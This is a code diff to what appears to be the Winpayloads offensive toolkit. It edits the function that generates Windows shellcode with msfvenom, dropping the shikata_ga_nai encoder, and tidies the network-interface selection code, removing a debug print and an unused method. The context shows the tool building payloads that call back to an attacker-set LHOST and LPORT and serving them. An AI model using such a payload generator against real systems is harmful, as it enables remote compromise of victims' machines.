@@ -37,7 +37,7 @@ def payloaddir():
     return os.path.expanduser('~') + '/winpayloads'
 
 def msfvenomGeneration(payload, ip, port):
-    p = subprocess.Popen(['msfvenom', '-p', payload, 'LHOST=' + str(ip), 'LPORT=' + str(port), '-f', 'python', '-e', 'x86/shikata_ga_nai'], bufsize=1024, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+    p = subprocess.Popen(['msfvenom', '-p', payload, 'LHOST=' + str(ip), 'LPORT=' + str(port), '-f', 'python'], bufsize=1024, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
     LOADING = Spinner('Generating Shellcode')
     while p.poll() == None:
         LOADING.Update()
@@ -47,7 +47,7 @@ def msfvenomGeneration(payload, ip, port):
 
     payload = p.stdout.read()
     compPayload = re.findall(r'"(.*?)"', payload)
-    
+
 
     return ''.join(map(str, compPayload))
 
@@ -75,7 +75,7 @@ class InterfaceSelecta():
 
         for i in interfaces:
             isdefault = ''
-            if self.defaultInterface == i['interface']:
+            if self.defaultInterface and self.defaultInterface == i['interface']:
                 isdefault = t.bold_green + ' [Default]' + t.normal
                 defaultsetinterface = i
             if set:
@@ -89,7 +89,6 @@ class InterfaceSelecta():
                         self.defaultInterface = i['interface']
                         return i
         else:
-            print defaultsetinterface
             return defaultsetinterface
 
 
@@ -195,26 +194,6 @@ class FUNCTIONS(object):
             pass
         except:
             print t.bold_red + '\n[*] Port in use' + t.normal
-
-
-    def ChooseInterface(self):
-        import netifaces
-        defaultInterface = netifaces.gateways()['default'][netifaces.AF_INET]
-        num = 0
-
-        for interface in netifaces.interfaces():
-            isDefault = ''
-            num += 1
-            if interface == defaultInterface[1]:
-                isDefault = t.bold_green + ' *' + t.normal
-
-            interfaces = [(str(num), {'interface': interface, 'addr': netifaces.ifaddresses(interface)[netifaces.AF_INET][0]['addr'], 'default': isDefault})]
-
-            for i in interfaces:
-                print t.bold_yellow + i[0] + ': ' + t.normal + i[1]['addr'] + i[1]['default']
-
-        #interfaceSelection = prompt_toolkit.prompt("Interface >", completer=WordCompleter(['back', 'exit']), style=prompt_toolkit.styles.style_from_dict({prompt_toolkit.token.Token: '#FFCC66'})
-
 
     def DoServe(self, IP, payloadname, payloaddir, port, printIt):
         if printIt:
